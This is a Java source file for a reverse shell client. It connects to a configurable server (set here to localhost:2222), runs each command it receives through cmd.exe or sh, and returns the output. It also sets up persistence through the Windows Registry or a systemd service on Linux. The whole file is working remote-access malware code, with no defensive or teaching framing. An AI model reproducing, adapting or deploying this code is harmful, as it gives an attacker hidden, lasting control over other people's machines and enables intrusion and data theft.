package obs1d1anc1ph3r.reverseshell;

import java.io.*;
import java.net.*;

public class ReverseShellClient {

    private static final String SERVER_IP = "localhost";
    private static final int SERVER_PORT = 2222;

    private Socket socket;
    private BufferedReader in;
    private PrintWriter out;
    private String currentDir = System.getProperty("user.dir");

    public static void main(String[] args) {
        ReverseShellClient client = new ReverseShellClient();
        client.start();
    }

    public void start() {
        try {
            connectToServer();
            setupPersistence();
            handleCommands();
        } catch (IOException e) {
            System.err.println("Connection error: " + e.getMessage());
        } finally {
            cleanup();
        }
    }

    private void connectToServer() throws IOException {
        System.out.println("[*] Connecting to server...");
        socket = new Socket(SERVER_IP, SERVER_PORT);
        System.out.println("[+] Connected to server: " + SERVER_IP + ":" + SERVER_PORT);

        in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        out = new PrintWriter(socket.getOutputStream(), true);
    }

    private void handleCommands() throws IOException {
        String command;
        while ((command = in.readLine()) != null) {
            if (command.equalsIgnoreCase("exit")) {
                System.out.println("[-] Server disconnected.");
                break;
            }

            if (command.startsWith("cd ")) {
                String newDir = command.substring(3).trim();
                newDir = newDir.replaceAll("/+$", "");
                newDir = newDir.trim();

                if (newDir.equals("..")) {
                    File parentDir = new File(currentDir).getParentFile();
                    if (parentDir != null) {
                        currentDir = parentDir.getAbsolutePath();
                        sendResponse("Changed directory to: " + currentDir);
                    } else {
                        sendResponse("Error: Already at the root directory");
                    }
                } else {
                    File dir = new File(currentDir, newDir);
                    if (dir.isDirectory()) {
                        currentDir = dir.getAbsolutePath();
                        sendResponse("Changed directory to: " + currentDir);
                    } else {
                        sendResponse("Error: Not a valid directory");
                    }
                }
            } else {
                String result = executeCommand(command);
                sendResponse(result);
            }
        }
    }

    private String executeCommand(String command) {
        StringBuilder output = new StringBuilder();

        try {
            ProcessBuilder processBuilder = new ProcessBuilder();
            processBuilder.command(getShell(), getShellFlag(), command);
            processBuilder.directory(new File(currentDir));
            processBuilder.redirectErrorStream(true);

            Process process = processBuilder.start();

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append(" ");
                }
            }
        } catch (IOException e) {
            return "Error executing command: " + e.getMessage();
        }

        return output.toString().trim();
    }

    private String getShell() {
        return isWindows() ? "cmd.exe" : "sh";
    }

    private String getShellFlag() {
        return isWindows() ? "/c" : "-c";
    }

    private boolean isWindows() {
        return System.getProperty("os.name").toLowerCase().contains("win");
    }

    private void sendResponse(String response) {
        out.println(response.trim());
        out.flush();
    }

    public void setupPersistence() {
        if (isWindows()) {
            Persistence.addToRegistry();
        } else {
            Persistence.addSystemdService();
        }
    }

    private void cleanup() {
        try {
            if (in != null) {
                in.close();
            }
            if (out != null) {
                out.close();
            }
            if (socket != null) {
                socket.close();
            }
        } catch (IOException e) {
            System.err.println("Error closing resources: " + e.getMessage());
        }
    }
}
